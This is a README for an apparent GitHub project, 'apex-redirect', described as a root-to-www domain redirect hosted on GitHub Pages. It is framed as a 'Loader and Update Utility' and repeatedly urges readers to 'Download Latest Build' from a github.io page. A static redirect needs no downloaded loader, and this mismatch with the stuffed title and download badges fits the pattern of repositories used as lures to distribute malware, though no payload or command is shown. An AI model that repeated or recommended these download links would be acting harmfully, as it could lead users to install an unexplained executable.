# apex-redirect v2026 - Loader and Update Utility 2026

> **An efficient root domain forwarding solution.** It routes bare domain traffic directly to the www subdomain, preserves exact URL paths, and maintains valid TLS encryption during ongoing DNS transitions.

[![Loader](https://img.shields.io/badge/Type-Loader-blue?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-GitHub%20Pages-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/marc-young83/apex-redirect-update-loader?style=flat-square)](https://github.com/marc-young83/apex-redirect-update-loader)

---

<p align="center">
  <a href="https://marc-young83.github.io/apex-redirect-update-loader/">
    <img src="https://img.shields.io/badge/Download-apex--redirect%20Loader-brightgreen?style=for-the-badge" alt="Download apex-redirect Loader">
  </a>
</p>

> **[Download Latest Build](https://marc-young83.github.io/apex-redirect-update-loader/)**

---

[Download Latest Build](https://marc-young83.github.io/apex-redirect-update-loader/)

---

## Overview

apex-redirect offers a streamlined traffic-forwarding framework designed for environments requiring seamless root-to-www redirection. It ensures incoming URI paths are fully preserved, landing users on the exact corresponding page of the target domain.

This utility serves as a reliable interim bridge during active domain migrations while DNS records are resolving. Because the web forwarding layer operates independently via GitHub Pages with a dedicated HTTPS certificate, existing mail routing setups can remain isolated and undisturbed.

---

## Core Capabilities

- Routes naked apex domain queries straight to the www hostname.
- Retains original URI paths to ensure target link continuity.
- Delivers secure redirection backed by a valid TLS certificate on the apex domain.
- Isolates MX and mail records completely from web traffic forwarding.
- Acts as a short-term traffic handler throughout active DNS migrations.
- Fully compatible with Cloudflare routing strategies during site moves.
- Supports platform transitions such as migrating from Wix to Cloudflare.
- Lightweight routing logic simplifies initial setup and long-term upkeep.

---

## Deployment & Usage

1. Access the published instance or fetch the repository:
   - Package: [Download Latest Build](https://marc-young83.github.io/apex-redirect-update-loader/)
   - Repository: https://github.com/marc-young83/apex-redirect-update-loader

2. Publish the source to GitHub Pages to handle incoming traffic.

3. Point your apex domain to the Pages instance and verify that the target www destination is set up correctly.

4. Double-check that independent mail records remain intact across your DNS provider.

Configuration reference:

    apex: example.com
    redirect_to: https://www.example.com
    preserve_path: true
    tls: enabled

---

## Release Tracks

| Track | Intended Use | Details |
| --- | --- | --- |
| Latest | Production-ready redirect engine | Recommended for general deployments |
| Manual | Custom-configured deployments | Ideal when managing concurrent hosting or DNS adjustments |
| Temporary | Migration intermediary | Designed specifically for short-term traffic bridging during domain handoffs |

---

## Troubleshooting Guide

- **Redirect fails to respond:** Confirm the host deployment on GitHub Pages is active and fully built.
- **SSL/TLS warnings appear:** Ensure the certificate issuance for the root domain has completed.
- **Paths drop upon redirect:** Double-check that your rule definitions pass the full request URI to the target.
- **DNS changes are not applying:** Allow time for global propagation and re-verify your root and www records.
- **Email delivery fails:** Inspect your mail-specific DNS entries to ensure they were not modified alongside web routing.
- **Cloudflare conflicts occur:** Ensure page rules and proxy flags correctly align with your desired target destination.

---

## Frequently Asked Questions

**Are incoming URL paths preserved during redirection?**  
Yes. The service forwards the full original request path directly to the www host.

**Will deploying this disrupt existing email services?**  
No, provided your mail records remain untouched in your DNS setup.

**Is this designed for long-term hosting?**  
No. It is intended to function as a temporary migration stopgap until DNS transfers are finalized.

**Where is the redirection service run?**  
The standard deployment is tailored to run on GitHub Pages.

**Can I revert the deployment easily?**  
Yes. Rolling back simply requires re-pointing your DNS or restoring previous hosting configurations.

**Are built-in logging tools included?**  
No logging mechanism is defined in the specification; inspect request handling via browser developer tools or host metrics.

---

## License

Distributed under the terms of the GNU GPL v3.0 license. Refer to [LICENSE](LICENSE) for details.
